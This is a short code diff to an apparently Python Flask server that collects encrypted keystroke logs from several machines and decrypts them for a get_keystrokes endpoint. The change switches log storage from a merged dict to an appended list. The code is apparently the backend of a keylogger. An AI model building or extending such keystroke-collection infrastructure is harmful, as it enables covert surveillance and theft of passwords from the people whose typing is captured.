@@ -34,19 +34,13 @@ def upload():
             try:
                 machine_exist_data = json.load(f)
             except json.JSONDecodeError:
-                machine_exist_data = {}
+                machine_exist_data = []
     except FileNotFoundError:
-        machine_exist_data = {}
-    machine_log = merge_dicts(machine_exist_data, log_data)
-    key = local_data[machine_sn]["key"]
-    # print(machine_data)
-    # print(key)
-    # print({decrypt(key,k): decrypt(key,v) for k, v in log_data.items()})
-
-    # print(f"e + {machine_log}")
-    # print(f"d + {decrypt_data}")
+        machine_exist_data = []
+    # machine_log = merge_dicts(machine_exist_data, log_data)
+    machine_exist_data.append(log_data)
     with open(machine_path + '/log.json', "w", encoding="utf-8") as f:
-        json.dump(machine_log, f, ensure_ascii=False, indent=4)
+        json.dump(machine_exist_data, f, ensure_ascii=False, indent=4)
 
     return jsonify({"status": "success"}), 200
 
@@ -115,13 +109,16 @@ def get_keystrokes():
 
         with open(file_path, 'r',encoding='utf-8') as f:
             try:
-                key_logs = json.load(f)
+
+                list_key_logs = json.load(f)
 
             except Exception as e:
                 return jsonify({"error":"logs not found"}),400
 
-        decrypt_data = {decrypt(key,k): decrypt(key,v) for k, v in key_logs.items()}
-        return jsonify({"logs":decrypt_data
+
+        decrypt_data_list = [{decrypt(key,k): decrypt(key,v) for k, v in data.items()} for data in list_key_logs]
+        merged_data = merge_dicts(*decrypt_data_list)
+        return jsonify({"logs":merged_data
                         }), 200
 
     except Exception as e:
